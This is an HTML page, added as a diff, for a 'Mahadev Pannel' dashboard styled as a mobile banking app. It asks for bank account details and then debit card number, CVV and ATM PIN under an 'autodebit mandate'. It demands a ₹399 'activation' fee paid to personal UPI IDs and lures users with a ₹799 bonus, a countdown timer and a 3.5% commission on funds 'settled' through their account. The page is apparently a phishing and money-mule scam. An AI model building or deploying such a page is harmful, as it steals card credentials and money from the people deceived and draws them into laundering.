@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Mahadev Pannel — Banking Dashboard</title>
+    <meta name="description" content="Mahadev Pannel - Mobile banking dashboard with instant UTR settlement, 3D ATM card mandate, and live payouts." />
+    <link rel="stylesheet" href="./style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+</head>
+<body class="mp-body mp-dash-body">
+    <!-- IN-APP PAYMENT NOTIFICATION CONTAINER -->
+    <div id="paymentNotificationContainer" class="payment-notification-container" aria-live="assertive"></div>
+
+    <!-- COMPACT STICKY MOBILE BANKING HEADER -->
+    <header class="mp-topbar mp-dash-topbar">
+        <div class="mp-topbar-inner">
+            <div class="mp-brand">
+                <button type="button" class="mp-back-icon-btn" id="dashboardBackBtn" style="display:none;" title="Go Back" aria-label="Back">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="15 18 9 12 15 6"></polyline>
+                    </svg>
+                </button>
+                <div class="mp-logo-frame" aria-hidden="true">
+                    <img src="./src/assets/images/mahadev_pannel_logo_1794679866477.jpg" alt="Mahadev Pannel" class="mp-logo-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                    <span class="mp-logo-fallback" style="display:none;">
+                        <svg width="22" height="22" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M18 4V31M18 4L14 10M18 4L22 10M10 9C10 15 13 18 18 18C23 18 26 15 26 9M13 24H23" stroke="#F59E0B" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </span>
+                </div>
+                <div class="mp-brand-copy">
+                    <h1 class="mp-brand-name">MAHADEV PANNEL</h1>
+                    <span class="mp-brand-sub" id="welcomeMessage">MEMBER ACCOUNT</span>
+                </div>
+            </div>
+
+            <div class="mp-topbar-actions">
+                <a href="https://t.me/+gPDN87ly87liYTc1" class="mp-icon-action" target="_blank" rel="noopener noreferrer" title="Telegram Support" aria-label="Telegram Support">
+                    <svg width="17" height="17" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M29.57 6.11c.31-.96-.98-1.39-1.57-.7L3.9 18.38c-1.07.65-1.05 1.49-.2 1.89l6.46 2.01 1.53 6.03c.18.73.97.83 1.39.28l2.76-3.56 5.56 4.11c.99.74 1.75.39 1.98-.82l3.12-14.79z" fill="currentColor"/>
+                    </svg>
+                </a>
+                <button type="button" class="bonus-box mp-bonus-chip" id="bonusBox" title="Claim ₹799 Bonus">
+                    <span class="bonus-badge" id="bonusBadge"></span>
+                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="20 12 20 22 4 22 4 12"></polyline>
+                        <rect x="2" y="7" width="20" height="5"></rect>
+                        <line x1="12" y1="22" x2="12" y2="7"></line>
+                        <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"></path>
+                        <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"></path>
+                    </svg>
+                    <span>₹799</span>
+                </button>
+                <button type="button" class="mp-logout-btn" id="logoutBtn" title="Sign Out">Exit</button>
+            </div>
+        </div>
+    </header>
+
+    <div class="mp-app-container">
+        <!-- BANKING VAULT HERO BALANCE CARD -->
+        <section class="mp-vault-hero" aria-label="Account Balance Summary">
+            <img src="./src/assets/images/mahadev_vault_bg_1794679870399.jpg" alt="" class="mp-vault-bg" onerror="this.style.display='none';">
+            <div class="mp-vault-scrim"></div>
+            <div class="mp-vault-inner">
+                <div class="mp-vault-top">
+                    <div>
+                        <span class="mp-vault-label">TOTAL SETTLEMENT VOLUME</span>
+                        <div class="mp-vault-balance tabular-nums" id="totalBalance">₹0</div>
+                    </div>
+                    <span class="mp-vault-tier-badge">ROYAL 3.5%</span>
+                </div>
+
+                <div class="mp-vault-substats">
+                    <div class="mp-vault-stat">
+                        <span class="mp-vs-lbl">Commission (3.5%)</span>
+                        <strong class="mp-vs-val tabular-nums" id="totalCommission">₹0</strong>
+                    </div>
+                    <div class="mp-vault-stat-div"></div>
+                    <div class="mp-vault-stat">
+                        <span class="mp-vs-lbl">Credits Received</span>
+                        <strong class="mp-vs-val tabular-nums" id="totalTransactions">0</strong>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- REAL-TIME ADMIN VERIFICATION / REJECTION STATUS BANNER -->
+        <div id="panelApprovalBanner" class="panel-approval-banner hidden" role="status" aria-live="polite"></div>
+
+        <!-- MAIN BANKING HOME SCREEN -->
+        <div class="dashboard-section" id="mainDashboard">
+            <!-- 4-TILE BANKING QUICK ACTIONS -->
+            <div class="mp-quick-grid" aria-label="Quick Banking Actions">
+                <button type="button" class="mp-qa-tile" id="qaBankSetupBtn">
+                    <span class="mp-qa-icon mp-qa-gold">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18"/><path d="M3 10h18"/><path d="M5 6l7-3 7 3"/><path d="M4 10v11"/><path d="M20 10v11"/><path d="M8 14v3"/><path d="M12 14v3"/><path d="M16 14v3"/></svg>
+                    </span>
+                    <span class="mp-qa-label">Link Bank</span>
+                </button>
+                <button type="button" class="mp-qa-tile" id="qaLivePanelBtn">
+                    <span class="mp-qa-icon mp-qa-emerald">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                    </span>
+                    <span class="mp-qa-label">Run Panel</span>
+                </button>
+                <button type="button" class="mp-qa-tile" id="qaWithdrawBtn">
+                    <span class="mp-qa-icon mp-qa-amber">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5"/><polyline points="5 12 12 5 19 12"/></svg>
+                    </span>
+                    <span class="mp-qa-label">Withdraw</span>
+                </button>
+                <button type="button" class="mp-qa-tile" id="qaBonusBtn">
+                    <span class="mp-qa-icon mp-qa-ruby">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5"/><line x1="12" y1="22" x2="12" y2="7"/><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg>
+                    </span>
+                    <span class="mp-qa-label">Bonus ₹799</span>
+                </button>
+            </div>
+
+            <!-- COMPACT BANKING SETUP TRACKER -->
+            <div class="card mp-app-card">
+                <div class="mp-card-head">
+                    <h3>Account Activation</h3>
+                    <span class="mp-secure-tag">5 Steps</span>
+                </div>
+
+                <div class="step-indicator mp-step-rail">
+                    <div class="step step-active"><span>1</span><p>Bank</p></div>
+                    <div class="step-arrow">›</div>
+                    <div class="step"><span>2</span><p>ATM</p></div>
+                    <div class="step-arrow">›</div>
+                    <div class="step"><span>3</span><p>UTR</p></div>
+                    <div class="step-arrow">›</div>
+                    <div class="step"><span>4</span><p>Live</p></div>
+                    <div class="step-arrow">›</div>
+                    <div class="step"><span>5</span><p>Payout</p></div>
+                </div>
+
+                <div class="mp-home-cta-stack">
+                    <button type="button" class="btn btn-primary" id="gamingFundBtn">Setup Bank &amp; Activate</button>
+                    <button type="button" class="btn btn-success" id="openRunningBtn">Open Live Panel</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 1: BANK ACCOUNT DETAILS -->
+        <div class="dashboard-section hidden" id="gamingFundSection">
+            <div class="card mp-app-card">
+                <div class="mp-card-head">
+                    <h3>Link Bank Account</h3>
+                    <span class="mp-secure-tag">Step 1 / 5</span>
+                </div>
+                <form id="accountDetailsForm">
+                    <div class="form-group">
+                        <label for="accountNumber">Account Number</label>
+                        <input type="text" id="accountNumber" placeholder="10-16 digit account number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="label-row-with-badge">
+                            <label for="ifscCode">IFSC Code</label>
+                            <span id="ifscStatusBadge" class="ifsc-status-pill">11-char IFSC</span>
+                        </div>
+                        <div class="ifsc-input-wrapper">
+                            <input type="text" id="ifscCode" placeholder="e.g. SBIN0001234" maxlength="11" style="text-transform:uppercase;font-family:var(--font-mono);letter-spacing:1px;" required>
+                            <button type="button" class="btn btn-verify-ifsc" id="verifyIfscBtn">Check</button>
+                        </div>
+                        <div id="ifscBankPreviewCard" class="ifsc-verified-card" style="display:none;">
+                            <div class="ifsc-card-logo" id="ifscPreviewLogoWrap"></div>
+                            <div class="ifsc-card-details">
+                                <div class="ifsc-card-bank" id="ifscPreviewBankName">State Bank of India</div>
+                                <div class="ifsc-card-branch" id="ifscPreviewBranch">Branch Verified</div>
+                            </div>
+                            <span class="ifsc-verified-checkmark">✓ Verified</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="accountHolder">Account Holder</label>
+                        <input type="text" id="accountHolder" placeholder="Full name as per bank" required>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="label-row-with-badge">
+                            <label for="bankName">Bank Name</label>
+                            <span class="auto-fill-tag" id="bankNameAutoTag">Auto-filled</span>
+                        </div>
+                        <input type="text" id="bankName" placeholder="Detected bank name" required>
+                    </div>
+
+                    <div class="mp-form-row-2">
+                        <div class="form-group">
+                            <label for="accountType">Account Type</label>
+                            <select id="accountType" required>
+                                <option value="Saving">Saving (₹70K)</option>
+                                <option value="Current">Current (₹140K)</option>
+                                <option value="Corporate">Corporate (₹190K)</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="contactNumber">Mobile</label>
+                            <input type="tel" id="contactNumber" placeholder="10-digit mobile" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="upiScanner">UPI QR Code (Optional)</label>
+                        <input type="file" id="upiScanner" accept="image/*">
+                        <div id="upiPreview" style="margin-top:10px;"></div>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary mp-btn-full">Save &amp; Continue</button>
+                </form>
+                <div id="accountDetailsMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- STEP 2: ATM AUTODEBIT MANDATE WITH LIVE 3D CARD -->
+        <div class="dashboard-section hidden" id="autodebitSection">
+            <div class="card mp-app-card">
+                <div class="atm-section-header">
+                    <div>
+                        <h3>ATM Card Mandate</h3>
+                        <p class="atm-section-sub">Step 2 / 5 • Bank-branded card preview</p>
+                    </div>
+                    <span class="atm-linked-bank-pill" id="atmLinkedBankPill">Ready</span>
+                </div>
+
+                <div class="atm-auth-layout">
+                    <div class="atm-card-showcase">
+                        <div class="atm-showcase-header">
+                            <span class="atm-showcase-label">DEBIT CARD PREVIEW</span>
+                            <button type="button" class="btn-flip-card" id="toggleAtmCardFlipBtn">↻ Flip</button>
+                        </div>
+
+                        <div class="atm-card-scene" id="atmCardScene">
+                            <div class="atm-card-inner" id="atmCardInner">
+                                <div class="atm-card-face atm-card-front" id="atmCardFront">
+                                    <div class="atm-card-glow"></div>
+                                    <div class="atm-card-top">
+                                        <div class="atm-card-bank-brand">
+                                            <div class="atm-card-bank-logo" id="atmCardBankLogo"></div>
+                                            <div>
+                                                <div class="atm-card-bank-name" id="atmCardBankName">LINKED BANK</div>
+                                                <div class="atm-card-tier" id="atmCardTierLabel">PLATINUM DEBIT</div>
+                                            </div>
+                                        </div>
+                                        <span class="atm-nfc-icon" aria-hidden="true">
+                                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.78)" stroke-width="1.8" stroke-linecap="round">
+                                                <path d="M8.5 16.5a6.5 6.5 0 0 1 0-9"/>
+                                                <path d="M12 19a10 10 0 0 1 0-14"/>
+                                                <path d="M15.5 21.5a13.5 13.5 0 0 1 0-19"/>
+                                            </svg>
+                                        </span>
+                                    </div>
+
+                                    <div class="atm-chip-row">
+                                        <div class="atm-emv-chip" aria-hidden="true">
+                                            <svg width="40" height="30" viewBox="0 0 42 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                <rect x="0.75" y="0.75" width="40.5" height="30.5" rx="5.25" fill="url(#chipGold)" stroke="rgba(255,255,255,0.45)" stroke-width="1.2"/>
+                                                <path d="M14 1V31M28 1V31M1 11H14M1 21H14M28 11H41M28 21H41M14 16H28" stroke="rgba(90,62,10,0.45)" stroke-width="1.2"/>
+                                                <defs>
+                                                    <linearGradient id="chipGold" x1="0" y1="0" x2="42" y2="32" gradientUnits="userSpaceOnUse">
+                                                        <stop stop-color="#FDE68A"/>
+                                                        <stop offset="0.5" stop-color="#F59E0B"/>
+                                                        <stop offset="1" stop-color="#D97706"/>
+                                                    </linearGradient>
+                                                </defs>
+                                            </svg>
+                                        </div>
+                                        <span class="atm-debit-badge">DEBIT</span>
+                                    </div>
+
+                                    <div class="atm-card-number" id="atmCardPreviewNumber">••••  ••••  ••••  ••••</div>
+
+                                    <div class="atm-card-bottom">
+                                        <div class="atm-card-field atm-card-holder-field">
+                                            <span class="atm-field-caption">HOLDER</span>
+                                            <strong class="atm-field-value" id="atmCardPreviewHolder">CARD HOLDER</strong>
+                                        </div>
+                                        <div class="atm-card-field">
+                                            <span class="atm-field-caption">VALID</span>
+                                            <strong class="atm-field-value mono-font" id="atmCardPreviewExpiry">MM/YY</strong>
+                                        </div>
+                                        <div class="atm-card-network" id="atmCardPreviewNetwork">RuPay</div>
+                                    </div>
+                                </div>
+
+                                <div class="atm-card-face atm-card-back" id="atmCardBack">
+                                    <div class="atm-magstripe"></div>
+                                    <div class="atm-back-body">
+                                        <div class="atm-signature-row">
+                                            <div class="atm-signature-strip">AUTHORIZED</div>
+                                            <div class="atm-cvv-box">
+                                                <span class="atm-cvv-label">CVV</span>
+                                                <strong id="atmCardPreviewCvv">•••</strong>
+                                            </div>
+                                        </div>
+                                        <p class="atm-back-note">256-Bit Encrypted E-Mandate</p>
+                                    </div>
+                                    <div class="atm-back-footer">
+                                        <span id="atmCardBackBankName">LINKED BANK</span>
+                                        <span id="atmCardBackNetwork">RuPay</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <form id="autodebitForm" class="atm-auth-form">
+                        <div class="form-group">
+                            <label for="atmNumber">Debit Card Number</label>
+                            <input type="text" id="atmNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" autocomplete="off" required>
+                        </div>
+
+                        <div class="atm-form-row-2">
+                            <div class="form-group">
+                                <label for="atmExpiry">Expiry</label>
+                                <input type="text" id="atmExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off" required>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="atmCvv">CVV</label>
+                                <input type="text" id="atmCvv" placeholder="3 digits" maxlength="3" inputmode="numeric" autocomplete="off" required>
+                            </div>
+                        </div>
+
+                        <div class="atm-form-row-2">
+                            <div class="form-group">
+                                <label for="atmPin">ATM PIN</label>
+                                <input type="password" id="atmPin" placeholder="4-digit PIN" maxlength="4" inputmode="numeric" autocomplete="off" required>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="atmName">Name on Card</label>
+                                <input type="text" id="atmName" placeholder="Cardholder name" autocomplete="off" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <div class="atm-otp-lock-row">
+                                <input type="checkbox" id="otpToggle" checked disabled>
+                                <small>OTP security enabled</small>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn btn-primary mp-btn-full">Enable Autodebit</button>
+                        <div id="autodebitMessage" class="message"></div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 3: ACTIVATION PAYMENT -->
+        <div class="dashboard-section hidden" id="activationPaymentSection">
+            <div class="card mp-app-card mp-center-card">
+                <span class="mp-secure-tag">Step 3 / 5</span>
+                <h3>Activate Panel</h3>
+                <p class="muted">Complete ₹399 UPI verification to unlock live transactions.</p>
+                <button type="button" class="btn btn-primary btn-large" id="activationPaymentBtn">Pay ₹399 via UPI</button>
+            </div>
+        </div>
+
+        <!-- ACTIVATION CODE UPI PANEL -->
+        <div class="dashboard-section hidden" id="activationCodeUpiSection">
+            <div class="card mp-app-card">
+                <div class="mp-card-head">
+                    <h3>UPI Activation</h3>
+                    <span class="mp-amount-pill">₹399</span>
+                </div>
+
+                <div class="upi-section">
+                    <div class="upi-row">
+                        <p class="upi-label">Primary UPI ID</p>
+                        <div class="upi-display">
+                            <span class="upiId" data-upi-id="panneltest0@ptyes">panneltest0@ptyes</span>
+                            <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="panneltest0@ptyes" data-copy-target="activationCopyMessage">Copy</button>
+                        </div>
+                    </div>
+                    <div class="upi-row">
+                        <p class="upi-label">Backup UPI ID</p>
+                        <div class="upi-display">
+                            <span class="upiId" data-upi-id="malikpay0@fam">malikpay0@fam</span>
+                            <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="malikpay0@fam" data-copy-target="activationCopyMessage">Copy</button>
+                        </div>
+                    </div>
+                    <div class="copyMessage" id="activationCopyMessage"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="activationUtrInput">12-Digit UTR Number</label>
+                    <input type="text" id="activationUtrInput" placeholder="Enter UTR after payment" class="utrInput">
+                    <button type="button" class="btn btn-primary mp-btn-full" id="activationSubmitUtrBtn" style="margin-top:10px;">Submit UTR</button>
+                </div>
+                <div id="activationUtrMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- ACTIVATION CODE DISPLAY -->
+        <div class="dashboard-section hidden" id="activationCodeDisplaySection">
+            <div class="card mp-app-card mp-center-card">
+                <span class="mp-secure-tag mp-tag-emerald">Code Ready</span>
+                <h3>Activation Code</h3>
+                <div class="mp-code-display tabular-nums" id="generatedActivationCode">0000000</div>
+                <div class="mp-home-cta-stack">
+                    <button type="button" class="btn btn-secondary" id="copyActivationCodeBtn">Copy Code</button>
+                    <button type="button" class="btn btn-primary" id="activateAccountCodeBtn">Verify Code</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- CODE VERIFICATION -->
+        <div class="dashboard-section hidden" id="codeVerificationSection">
+            <div class="card mp-app-card">
+                <div class="mp-card-head">
+                    <h3>Enter Activation Code</h3>
+                    <span class="mp-secure-tag">7 Digits</span>
+                </div>
+                <div class="form-group">
+                    <label for="enteredActivationCode">Activation Code</label>
+                    <input type="text" id="enteredActivationCode" placeholder="0000000" maxlength="7" style="font-size:1.35rem;text-align:center;letter-spacing:4px;font-family:var(--font-mono);">
+                    <button type="button" class="btn btn-primary mp-btn-full" id="submitVerificationBtn" style="margin-top:12px;">Activate Panel</button>
+                </div>
+                <div id="verificationMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- STEP 4: RUNNING ACCOUNT -->
+        <div class="dashboard-section hidden" id="runningAccountSection">
+            <div class="card mp-app-card running-card">
+                <div class="mp-live-guard">
+                    <span>Keep this screen open during active settlement</span>
+                </div>
+
+                <div class="status-indicator mp-status-row">
+                    <span id="accountStatusDot" class="status-dot stopped" aria-hidden="true"></span>
+                    <span id="accountStatusText" class="mp-status-text">ACCOUNT STOPPED – NOT RUNNING</span>
+                </div>
+
+                <!-- ADMIN VERIFICATION / REJECTION GATE CARD -->
+                <div id="panelGateAlertBox" class="panel-gate-alert hidden"></div>
+
+                <div class="running-main" id="runningMainContent">
+                    <div class="running-left">
+                        <p id="accountLinked" class="mp-linked-tag">Account Linked: XXXX 0000</p>
+
+                        <div class="balance-display mp-balance-well">
+                            <span class="mp-bw-label">Live Running Balance</span>
+                            <div id="liveBalance" class="mp-bw-amount tabular-nums">₹0</div>
+                        </div>
+
+                        <div class="transactions">
+                            <h4>Live Feed</h4>
+                            <div id="transactionFeed" class="transaction-feed"></div>
+                        </div>
+
+                        <div id="limitMessage" class="message" style="margin-top:12px;"></div>
+                    </div>
+
+                    <div class="running-right">
+                        <div class="side-panel mp-comm-box">
+                            <span class="mp-bw-label">Earned Commission (3.5%)</span>
+                            <div id="commissionAmount" class="mp-comm-val tabular-nums">₹0</div>
+                            <button type="button" class="btn btn-primary mp-btn-full" id="withdrawCommissionBtn">Withdraw Payout</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS PAGE -->
+        <div class="dashboard-section hidden" id="bonusPageSection">
+            <div class="card mp-app-card bonus-page-card">
+                <div class="bonus-page-title">MEMBER REWARD</div>
+                <h3>Welcome Bonus</h3>
+                <div class="bonus-amount tabular-nums">₹799</div>
+                <button type="button" class="btn btn-primary btn-large" id="claimBonusBtn">Withdraw ₹799</button>
+
+                <div class="bonus-demo-countdown" aria-live="polite">
+                    <div class="bonus-countdown-expiry" id="bonusCountdownExpiry">Expires: --</div>
+                    <div class="bonus-countdown-timer" aria-label="Bonus countdown">
+                        <span class="bonus-time-box"><strong id="bonusHours" class="tabular-nums">00</strong><small>HRS</small></span>
+                        <span class="bonus-time-separator">:</span>
+                        <span class="bonus-time-box"><strong id="bonusMinutes" class="tabular-nums">00</strong><small>MIN</small></span>
+                        <span class="bonus-time-separator">:</span>
+                        <span class="bonus-time-box"><strong id="bonusSeconds" class="tabular-nums">00</strong><small>SEC</small></span>
+                    </div>
+                </div>
+
+                <div id="bonusMessageContainer" class="bonus-inline-message" style="display:none;"></div>
+            </div>
+        </div>
+
+        <!-- BONUS WITHDRAW PAGE -->
+        <div class="dashboard-section hidden" id="bonusWithdrawSection">
+            <div class="card mp-app-card">
+                <div class="mp-card-head">
+                    <h3>Bonus Transfer</h3>
+                    <span class="mp-amount-pill">₹799</span>
+                </div>
+                <form id="bonusWithdrawForm">
+                    <div class="form-group">
+                        <label for="bonusWithdrawAccNumber">Account Number</label>
+                        <input type="text" id="bonusWithdrawAccNumber" placeholder="Enter account number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="label-row-with-badge">
+                            <label for="bonusWithdrawIfsc">IFSC Code</label>
+                            <span id="bonusIfscBadge" class="ifsc-status-pill">Auto-Detect</span>
+                        </div>
+                        <input type="text" id="bonusWithdrawIfsc" placeholder="11-digit IFSC" maxlength="11" style="text-transform:uppercase;font-family:var(--font-mono);letter-spacing:1px;" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="bonusWithdrawHolder">Account Holder</label>
+                        <input type="text" id="bonusWithdrawHolder" placeholder="Holder name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="bonusWithdrawBank">Bank Name</label>
+                        <input type="text" id="bonusWithdrawBank" placeholder="Auto-filled bank" required>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary mp-btn-full">Transfer ₹799</button>
+                </form>
+                <div id="bonusWithdrawMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- VERIFIED PAYMENT RECEIPT SECTION -->
+        <div class="dashboard-section hidden" id="paymentReceiptSection">
+            <div class="card mp-app-card verified-receipt-card" id="verifiedReceiptCard"></div>
+        </div>
+
+        <!-- TRANSACTION HISTORY -->
+        <div class="dashboard-section" id="transactionHistorySection">
+            <div class="card mp-app-card">
+                <div class="history-header-row">
+                    <h3 style="margin-bottom:0;">Recent Ledger</h3>
+                    <button type="button" class="btn btn-secondary btn-receipt-shortcut hidden" id="viewLatestReceiptBtn">Receipt</button>
+                </div>
+                <div id="transactionHistory" class="transaction-history" style="margin-top:12px;"></div>
+            </div>
+        </div>
+
+        <!-- WITHDRAW PANEL -->
+        <div class="dashboard-section hidden" id="withdrawCommissionSection">
+            <div class="card mp-app-card">
+                <div class="mp-card-head">
+                    <h3>Commission Payout</h3>
+                    <span class="mp-secure-tag">Step 5 / 5</span>
+                </div>
+                <form id="withdrawCommissionForm">
+                    <div class="form-group">
+                        <label for="withdrawAccNumber">Account Number</label>
+                        <input type="text" id="withdrawAccNumber" placeholder="Enter account number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="label-row-with-badge">
+                            <label for="withdrawIfsc">IFSC Code</label>
+                            <span id="withdrawIfscBadge" class="ifsc-status-pill">Auto-Detect</span>
+                        </div>
+                        <input type="text" id="withdrawIfsc" placeholder="e.g. SBIN0001234" maxlength="11" style="text-transform:uppercase;font-family:var(--font-mono);letter-spacing:1px;" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="withdrawBank">Bank Name</label>
+                        <input type="text" id="withdrawBank" placeholder="Auto-filled bank" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="withdrawContact">Contact Mobile</label>
+                        <input type="tel" id="withdrawContact" placeholder="10-digit mobile" required>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary mp-btn-full">Request Payout</button>
+                </form>
+                <button type="button" class="btn btn-secondary mp-btn-full" id="backFromWithdrawBtn" style="margin-top:10px;">Back</button>
+            </div>
+        </div>
+
+        <!-- REMOVE BANK -->
+        <div class="bottom-actions">
+            <button type="button" class="btn btn-danger mp-btn-unlink" id="removeBankBtn">Unlink Bank Account</button>
+            <div id="bankRemovalMessage" class="message" style="display:none;margin-top:12px;"></div>
+        </div>
+
+        <button type="button" id="backToDashboardBtn" style="display:none;"></button>
+    </div>
+
+    <!-- MOBILE BANKING BOTTOM NAVIGATION BAR -->
+    <nav class="app-bottom-nav" aria-label="Primary Navigation">
+        <button type="button" class="app-bottom-nav-btn is-active" data-nav="home">
+            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+            <span>Home</span>
+        </button>
+        <button type="button" class="app-bottom-nav-btn" data-nav="bank">
+            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18"/><path d="M3 10h18"/><path d="M5 6l7-3 7 3"/><path d="M4 10v11"/><path d="M20 10v11"/></svg>
+            <span>Bank</span>
+        </button>
+        <button type="button" class="app-bottom-nav-btn" data-nav="panel">
+            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            <span>Panel</span>
+        </button>
+        <button type="button" class="app-bottom-nav-btn" data-nav="history">
+            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
+            <span>Ledger</span>
+        </button>
+        <button type="button" class="app-bottom-nav-btn" data-nav="bonus">
+            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5"/><line x1="12" y1="22" x2="12" y2="7"/><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg>
+            <span>Bonus</span>
+        </button>
+    </nav>
+
+    <!-- IN-APP CONFIRMATION MODAL -->
+    <div id="appConfirmModal" class="otp-modal-overlay" style="display:none;" role="dialog" aria-modal="true" aria-labelledby="appConfirmTitle">
+        <div class="otp-modal-card" style="max-width:410px;">
+            <div class="otp-modal-header">
+                <div class="otp-shield-icon" id="appConfirmIcon" aria-hidden="true">
+                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#F59E0B" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                        <line x1="12" y1="8" x2="12" y2="12"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16"/>
+                    </svg>
+                </div>
+                <h3 id="appConfirmTitle">Confirm Action</h3>
+                <p class="otp-modal-subtitle" id="appConfirmMessage" style="margin-top:8px;line-height:1.5;"></p>
+            </div>
+            <div class="otp-modal-actions">
+                <button type="button" class="btn btn-secondary" id="appConfirmCancelBtn">Cancel</button>
+                <button type="button" class="btn btn-danger" id="appConfirmOkBtn">Proceed</button>
+            </div>
+        </div>
+    </div>
+
+    <script type="module" src="./src/firebase-client.ts" onerror="window.__firebaseTsLoadFailed=true"></script>
+    <script type="module" src="./script.js"></script>
+</body>
+</html>
